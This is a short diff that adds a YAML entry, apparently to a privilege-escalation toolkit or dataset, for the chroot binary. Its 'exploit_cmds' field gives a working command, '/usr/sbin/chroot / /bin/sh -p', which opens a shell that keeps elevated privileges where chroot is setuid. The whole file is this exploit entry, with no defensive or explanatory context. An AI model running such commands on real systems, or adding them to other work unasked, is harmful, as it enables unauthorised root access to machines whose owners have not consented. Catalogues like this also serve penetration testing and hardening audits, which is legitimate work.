@@ -1,0 +1,4 @@
+name: chroot
+binary_path: /usr/sbin/chroot
+exploit_cmds:
+- /usr/sbin/chroot / /bin/sh -p
